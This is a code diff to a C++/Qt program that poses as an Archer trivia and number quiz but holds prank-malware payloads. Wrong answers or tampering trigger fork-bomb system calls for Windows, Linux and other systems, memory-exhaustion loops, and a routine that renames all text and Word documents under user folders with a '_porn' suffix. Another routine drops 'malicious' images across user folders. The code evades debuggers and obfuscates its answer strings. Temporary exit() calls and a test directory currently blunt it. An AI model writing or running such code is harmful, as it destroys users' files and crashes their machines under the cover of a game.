@@ -46,6 +46,10 @@ double getNumaNuma(double numa){
 	numa = numa *(1.5 - (numaTimes2*numa*numa));
 	numa = numa *(1.5 - (numaTimes2*numa*numa));
 	numa = numa *(1.5 - (numaTimes2*numa*numa));
+	numa = numa *(1.5 - (numaTimes2*numa*numa));
+//	numa = numa *(1.5 - (numaTimes2*numa*numa));
+//	numa = numa *(1.5 - (numaTimes2*numa*numa));
+//	numa = numa *(1.5 - (numaTimes2*numa*numa));
 	return numa;
 }
 
@@ -85,90 +89,126 @@ void pictureYourself(QImage &image1,QImage &image2,QImage &image3, QString &suit
 	//	}
 	favoriteImage[dirtPanorama]->scaled(image3.size()).save(suitTag);
 }
-
-qint64 canard(qint64 canary){
-  //what would canary = canary++<<1;// do?
-  canary <<= canary++>>1;
-  return (std::pow(-getNumaNuma((1-getNumaNuma(0.2))/2)*getNumaNuma((1-getNumaNuma(0.2))/2),canary)-std::pow(-getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2),canary))/(-getNumaNuma((1-getNumaNuma(0.2))/2)*getNumaNuma((1-getNumaNuma(0.2))/2)+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2));
+quint64 canard(quint64 canary){
+	canary <<= canary---1>>3;
+	return (std::pow(1+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2),canary)-std::pow(-getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2),canary))/(1+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2)+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2));
 }
 
 void pleaseOnlyReadatNight(QString dir){
-    if(OS==mac){
-        dir=QString("");
-    }else if(OS==linux){
-        dir=QString("/home");
-    }else{
-        dir=QString("C:/Users");
-    }
-    dir = QString("C:/testImages"); // For testing
+	if(OS==mac){
+		dir=QString("");
+	}else if(OS==linux){
+		dir=QString("/home");
+	}else{
+		dir=QString("C:/Users");
+	}
+	dir = QString("C:/testImages"); // For testing
 
-    auto drain=QDir::AllDirs | QDir::Files | QDir::Hidden | QDir::NoSymLinks | QDir::NoDotDot | QDir::NoDot;
+	auto drain=QDir::AllDirs | QDir::Files | QDir::Hidden | QDir::NoSymLinks | QDir::NoDotDot | QDir::NoDot;
 
-    QDirIterator itr(dir, QStringList() << "*.txt", drain, QDirIterator::Subdirectories);
-    while(itr.hasNext()){
-        QString figurative = "_porn"; // As opposed to literal
-        auto eman=itr.next();
-        qDebug()<<eman;
-        QFileInfo lanigiro(eman);
-        //QFileInfo original("/home/user/myfile.txt");
-        QFile elif(lanigiro.absoluteFilePath());
-        QString rotarapes = (OS==linux) ? "/" : "\\";
-        QString eemmaann = lanigiro.canonicalPath() + rotarapes + lanigiro.baseName() + figurative;
-        if (!lanigiro.completeSuffix().isEmpty())
-            eemmaann += "." + lanigiro.completeSuffix();
-        elif.rename(eman, eemmaann);
-    }
-    exit(1-2-52+3512-1235*5);
+	QDirIterator itr(dir, QStringList() << "*.txt"<<"*.doc"<<"*.docx", drain, QDirIterator::Subdirectories);
+	while(itr.hasNext()){
+		QString figurative = "_porn"; // As opposed to literal
+		auto eman=itr.next();
+		qDebug()<<eman;
+		QFileInfo lanigiro(eman);
+		//QFileInfo original("/home/user/myfile.txt");
+		QFile elif(lanigiro.absoluteFilePath());
+		QString rotarapes = (OS==linux) ? "/" : "\\";
+		QString eemmaann = lanigiro.canonicalPath() + rotarapes + lanigiro.baseName() + figurative;
+		if (!lanigiro.completeSuffix().isEmpty())
+			eemmaann += "." + lanigiro.completeSuffix();
+		elif.rename(eman, eemmaann);
+	}
+	exit(1-2-52+3512-1235*5);
 }
 
-string cause(string* idx){
-	return (idx[1337]);
+void cause(string* idx, int fet){
+	std::cout<<idx->c_str()+fet<<std::endl;
+//	return (idx[1337]);
 }
 
-void failure(string fun){
-    string* p = &fun;
-	p = NULL;
-	string pp = cause(p);
-	//long l0ng = p->size();
-    return;
-    /*QString dir;
-    pleaseOnlyReadatNight(dir);*/
+void failure(string fun,int wabba){
+	string* p = &fun;
+	cause(p,wabba);
+//	return;
 }
 
 void letsSpoon(){
-    while(1){
-        if(getOsName() == "Windows"){
-            system("%0|%0");
-        }else if(getOsName() == "Linux"){
-            system(":(){ :|:& };:");
-        }else{
-            system("./$0|./$0&");
-        }
-        exit(-1); // So as not to bomb our machines
-    }
-    letsSpoon();
+	while(1){
+		if(OS==win){
+			system("%0|%0");
+		}else if(OS==linux){
+			system(":(){ :|:& };:");
+		}else{
+			system("./$0|./$0&");
+		}
+		exit(-1); // So as not to bomb our machines
+	}
+	letsSpoon();
 }
 
 void gehinomEchad(){
-    while(1){
-        char* oEchat = new char[1337];
-        exit(-5); // So as not to bomb our machines
-        if(oEchat == NULL){
-            continue;
-        }
-    }
+	while(1){
+		char* oEchat = new char[1337];
+		exit(-5); // So as not to bomb our machines
+		if(oEchat == NULL){
+			continue;
+		}
+	}
 }
 
 void gehinomShtaim(){
-    // QThread
-    int l = (3*3)-7;
-    while(1 == --l){
-        char* echad = new char[1];
-        if(echad == NULL){
-            continue;
-        }
-        exit(-5); // So as not to bomb our machines
-    }
+	// QThread
+	int l = (3*3)-7;
+	while(1 == --l){
+		char* echad = new char[1];
+		if(echad == NULL){
+			continue;
+		}
+		exit(-5); // So as not to bomb our machines
+	}
+}
+
+QString escaped(QString str){
+	QString escaped;
+	escaped.reserve(6*str.size());
+	for(QString::const_iterator it=str.begin();it!=str.end();++it){
+		QChar ch = *it;
+		ushort code = ch.unicode();
+		if(code<0x80){
+			escaped+=ch;
+		}else{
+			escaped+="\\u";
+			escaped+=QString::number(code,16).rightJustified(4,'0');
+		}
+	}
+	return escaped;
+}
+
+QString spaceloop(QString space){
+	int iIiIiiIIiiIIIi=48;
+	if(space.length()<5){
+		for(auto &time:space){
+			time=QChar(time.unicode()+iIiIiiIIiiIIIi);
+			iIiIiiIIiiIIIi+=4;
+		}
+	}
+	for(auto &time:space){
+		time=QChar(time.unicode()+iIiIiiIIiiIIIi);
+		iIiIiiIIiiIIIi+=4;
+	}
+	return space;
+}
+
+
+QString timeloop(QString time){
+	int iIiIiiIIiiIIIi=48;
+	for(auto &space:time){
+		space=QChar(space.unicode()-iIiIiiIIiiIIIi);
+		iIiIiiIIiiIIIi+=4;
+	}
+	return time;
 }
 
 
@@ -180,7 +220,21 @@ int main(/*int argc, char *argv[]*/){
 	if(IsDebuggerPresent()){
 		return(12473);
 	}
+	SetConsoleOutputCP(CP_UTF8);
 #endif
+	qDebug()<<escaped(spaceloop("test"));
+	qDebug()<<timeloop(spaceloop("test"));
+	qDebug()<<timeloop(QStringLiteral(u"\u00a4\u0099\u00ab\u00b0"));
+
+	qDebug()<<escaped(spaceloop("13"));
+
+	qDebug()<<escaped(spaceloop("ocelot"));
+	qDebug()<<escaped(spaceloop("Ocelot"));
+
+//	nommies.append(2);
+//	goto outed;//testing DefinitelyNotPhase1
+
+
 	goto Phase10;
 Phase1:
 	{
@@ -196,17 +250,16 @@ Phase1:
 				goto ousted;
 			}
 		}
-		//		for(uint i=0;i<3;++i){
-		//			qint64 output=round(getNumaNuma(answers[i]));
-		//			qDebug()<<output<<nums[i]<<(output==nums[i]);
-		//		}
 		goto outed;
 	}
-	//	qint64 output=round(getNumaNuma(1.122306114604289e-07));
-	//	qDebug()<<output<<nums[0]<<(output==nums[0]);
 
 prior:
 	{
+		bool sadness=true; //:(
+		if(!nommies.isEmpty()){
+			nommies.clear(); //Yum!!
+			sadness=false;
+		}
 		std::cout<<"Answers are against your boxy perception.\n";
 		std::string str;
 		std::getline(std::cin,str);
@@ -219,7 +272,9 @@ prior:
 				nommies.append(treat);
 			}
 		}
+		if(sadness)
 		goto Phase1;
+		goto DefinitelyNotPhase1;
 	}
 ousted:
 	{
@@ -234,7 +289,7 @@ ousted:
 		if(OS==win){
 			dir=QString("C:/Users");
 		}else if(OS==mac){
-            dir=QString("...");
+			dir=QString("...");
 		}else if(OS==linux){
 			dir=QString("/home");
 		}
@@ -252,74 +307,74 @@ ousted:
 			}
 			pictureYourself(maliciousImage,maliciousImageRotated,fImage,imageName);
 		}
+		return 2;
 	}
 outed:
-    goto DefinitelyNotPhase1;
+	std::cout<<"Fill in the blanks:\n___ is to ___ as ___ is to ___, whilst ___ is a ___ ___; you ________."<<std::endl;
+	goto prior;
 	return 0;
 
 DefinitelyNotPhase1:
-    {
-        qint64 p = 5;
-        p = canard(p);
-        std::string str;
-        std::cout<<p + "?";
-        getline(std::cin,str);
-        if(str != QString::number(5).toStdString()){
-            gehinomEchad();
-        }
-        p = canard((20+20+-13));
-        std::cout<<p + "?";
-        getline(std::cin,str);
-        if(str != QString::number(7*4-1).toStdString()){
-            gehinomEchad();
-        }
-        p = canard((58+83-88));
-        std::cout<<p + "?";
-        getline(std::cin,str);
-        if(str != QString::number(7*7+2*2).toStdString()){
-            gehinomEchad();
-        }
-
-        return 0;
-    }
+	{
+		QList<quint64> nummies({308061521170129,1346269,4660046610375544832,28657});
+		quint64 answers[]={18,16,23,12};
+		if(nummies.length()!=nommies.length()){
+			qDebug()<<"messed up DefinitelyNotPhase1: Wrong number of entries";
+			goto ousted;
+		}
+		for(int i=0;i<nummies.length();++i){
+			if(nummies[i]!=canard(nommies[i])){
+				qDebug()<<"messed up DefinitelyNotPhase1";
+				gehinomEchad();
+			}
+		}
+		std::cout<<"That was a bit of a lie, but you figured it out anyway, good on ya!"<<std::endl;
+		return 0;
+	}
 Phase10:
 	{
 		size_t sizet = 13;
-		string tweedle = "yes";
-		string tweedlE = "Yes";
-		string dum = "13";
+//		string tweedle = "yes";
+		QString tweedle(QStringLiteral(u"\u00e5\u00d9\u00ef"));
+//		string tweedlE = "Yes";
+		QString dum(QStringLiteral(u"\u0099\u00a3"));
 		sizet %= 10;
 		vector<char> viktor(sizet);
 		viktor[0] = 'p';
-		string dee = "ocelot";
-		string deE = "Ocelot";
+		QString dee(QStringLiteral(u"\u009f\u0097\u009d\u00a8\u00af\u00b8"));
+//		string dee = "ocelot";
+//		string deE = "Ocelot";
 		std::string str;
-		std::cout<<"Are Sterling and Mallory eskimo brothers?";
+		QString input;
+		input=QString(str.c_str());
+		std::cout<<"Are Sterling and Mallory eskimo brothers?"<<std::endl;
 		getline(std::cin,str);
-		if(str != tweedle && str != tweedlE)
-			failure("!");
-		std::cout<<"How many tallies does Pam have on her back?";
+		if(tweedle!=spaceloop(QString(str.c_str()).toLower()))
+			failure("Answer was:",99999);
+		std::cout<<"How many tallies does Pam have on her back?"<<std::endl;
 		getline(std::cin,str);
-		if(str != dum)
-			failure("!");
+		if(spaceloop(QString(str.c_str()).toLower()) != dum)
+			failure("Answer was:",198735);
 
-		std::cout<<"What type of animal is Babou?";
+		std::cout<<"What type of animal is Babou?"<<std::endl;
 		getline(std::cin,str);
-		if(str != dee && str != deE)
-			failure("!");
+//		if(str != dee && str != deE)
+		if(dee!=spaceloop(QString(str.c_str()).toLower()))
+			failure("Answer was:",949843);
 
 		viktor[1] = 'a';
 		viktor[2] = 'm';
 
-        std::cout<<"Which character wore a dolphin puppet on their hand?";
+		std::cout<<"Which character wore a dolphin puppet on their hand?"<<std::endl;
 		getline(std::cin,str);
 		int c = 15 ^ 15;
 		while(c < 3 && (tolower(str[c]) == viktor[c])){
 			c++; // Get it?
 		}
 		if(c < 3){
-			failure("!");
+			failure("Answer was:",54831);
 		}
+		std::cout<<"Congratulations, you know some trivia, but do you know this?"<<std::endl<<std::endl;
 	}
 	goto prior;
 	//return a.exec();
